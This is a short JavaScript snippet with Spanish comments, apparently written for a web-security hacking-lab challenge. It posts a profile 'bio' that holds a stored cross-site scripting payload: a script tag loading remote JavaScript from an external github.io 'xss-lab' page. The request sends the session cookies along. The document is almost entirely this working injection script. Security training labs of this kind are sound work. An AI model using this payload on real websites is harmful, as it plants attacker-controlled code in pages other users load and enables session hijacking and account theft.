// Browser: fetch + FormData
async function postProfile() {
  const url = 'https://chl-2fa52546-3adb-4123-a1a8-c97120a69880-blog-hacklab-v2.softwareseguro.com.ar/profile';

  // Construir FormData
  const form = new FormData();
  form.append('bio', '<script src="https://guidobitti.github.io/xss-lab/blog3.js"></script>');

  // Si querés subir un archivo (aquí un ejemplo con <input type="file">)
  // const fileInput = document.querySelector('#file');
  // form.append('profile_pic', fileInput.files[0]);

  // En tu curl el filename estaba vacío; si querés enviar un archivo vacío puedes
  // form.append('profile_pic', new Blob([], { type: 'application/octet-stream' }), '');

  try {
    const resp = await fetch(url, {
      method: 'POST', // o 'PATCH' si realmente el endpoint espera PATCH
      body: form,
      // Las siguientes cabeceras no hace falta ponerlas (y algunas no se pueden setear)
      headers: {
        // 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
        // NO pongas 'Content-Type': fetch lo gestiona por FormData
      },
      // enviar cookies (importantísimo si la sesión se gestiona vía cookie)
      credentials: 'include' // -> envía cookies del sitio
    });

    const text = await resp.text();
    console.log('Status:', resp.status);
    console.log('Response body:', text);
  } catch (err) {
    console.error('Fetch error:', err);
  }
}

postProfile();
